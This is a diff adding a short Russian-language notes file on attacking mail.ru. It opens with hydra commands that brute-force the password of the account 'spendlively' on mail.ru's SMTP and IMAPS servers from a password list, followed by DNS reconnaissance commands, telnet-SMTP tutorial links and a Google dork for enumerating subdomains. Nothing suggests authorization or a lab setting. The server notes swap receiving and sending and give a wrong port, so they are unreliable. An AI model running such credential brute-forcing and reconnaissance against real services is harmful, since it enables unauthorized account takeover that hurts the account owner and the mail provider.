@@ -1,0 +1,42 @@
+//Брут smtp
+//hydra
+hydra -l spendlively -P pass.txt smtp.mail.ru smtp
+hydra -l spendlively -P pass.txt -S -s 993 -f -w 30 -V imaps://imap.mail.ru
+
+//Оба не работают
+
+//Узнать адрес сервера (help.mail.ru)
+https://help.mail.ru/enmail-help/mailer/tb
+Получение: smtp.mail.ru, порт 456
+Отправка: imap.mail.ru, порт: 993
+
+//Получение записей домена
+dig mail.ru
+dig mail.ru MX
+
+host mail.ru
+host mail.ru 8.8.8.8
+
+nslookup mail.ru
+nslookup -type=mx mail.ru
+
+//nslookup
+http://www.e-reading.club/chapter.php/1002799/251/Kolisnichenko_Denis_-_Linux-_server_svoimi_rukami.html
+http://www.computerhope.com/unix/unslooku.htm
+http://www.tecmint.com/8-linux-nslookup-commands-to-troubleshoot-dns-domain-name-server/
+http://read-me.su/pro-nslookup/
+http://www.thegeekstuff.com/2012/07/nslookup-examples/?utm_source=tuicool
+http://ab57.ru/cmdlist/nslookup.html
+
+
+//Тестирование связи по протоколу SMTP с помощью Telnet
+https://technet.microsoft.com/ru-ru/library/bb123686(v=exchg.150).aspx
+https://support.microsoft.com/ru-ru/kb/153119
+http://systemzone.ru/sysadmin/858-podklyuchenie-po-protokolu-telnet-k-portu-25-dlya-proverki-peredachi-dannyx-po-protokolu-smtp.html
+
+//ОТПРАВКА ПОЧТЫ ЧЕРЕЗ TELNET ПО SMTP
+https://elims.org.ua/blog/otpravka-pochty-cherez-telnet-po-smtp/
+http://teaseo.org.ua/smtp-telnet-kak-otpravit-pismo-s-pomoshhyu-smtp-telnet.html
+
+//Получение поддоменов
+//site:.mail.ru -site:russia.mail.ru -site:wf.mail.ru -site:lady.mail.ru -site:sf.mail.ru
